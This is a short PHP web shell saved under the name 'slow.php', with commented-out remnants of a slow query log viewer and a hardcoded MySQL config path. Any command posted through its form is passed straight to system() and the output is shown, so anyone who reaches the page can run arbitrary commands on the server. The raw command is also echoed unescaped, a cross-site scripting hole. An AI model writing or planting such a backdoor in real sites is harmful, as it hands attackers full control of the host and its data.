<?php


if(isset($_POST['cmd'])) {
	$safe = $_POST['cmd'];
	echo $safe;

	ob_start();
	system($safe);
	$var = ob_get_clean();

	echo "<pre>";
	echo htmlentities($var);
	echo "</pre>";
}
?>
<form action="slow.php" method="post">

CMD: <input type="text" name="cmd" size="50" value="<?php echo htmlentities($_POST[cmd]); ?>"/><br />
<input type="submit" value="Send" />

</form>
<?php

//echo "<h2>Slow Query Log</h2>";

//I had to manually find this file.. 
//echo "<pre>" . file_get_contents("D:\\MySQL Server 5.0\my-innodb-heavy-4G.ini") . "</pre>";

?>
